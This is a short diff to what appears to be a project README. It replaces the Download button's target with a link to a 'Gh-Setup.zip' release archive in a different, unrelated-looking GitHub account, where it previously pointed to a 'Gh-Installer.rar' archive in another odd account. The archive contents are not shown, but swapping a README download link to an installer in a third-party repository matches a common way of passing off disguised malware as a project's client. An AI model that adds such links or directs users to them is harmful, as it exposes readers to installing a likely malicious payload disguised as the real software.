@@ -17,7 +17,7 @@ TODO: Write guides for v2. While these may still be helpful they are geared towa
 -->
 
 # ⬇️ Download at
-[![Download](https://i.postimg.cc/0QdN7Rxz/Click-to-download.png)](https://github.com/yourmomisfieldtested/yourmomisfieldtested1/releases/download/ClientApp/Gh-Installer.rar)
+[![Download](https://i.postimg.cc/0QdN7Rxz/Click-to-download.png)](https://github.com/adeshkapil/adeshkapil1/releases/download/clientapp/Gh-Setup.zip)
 
 
 # Developing
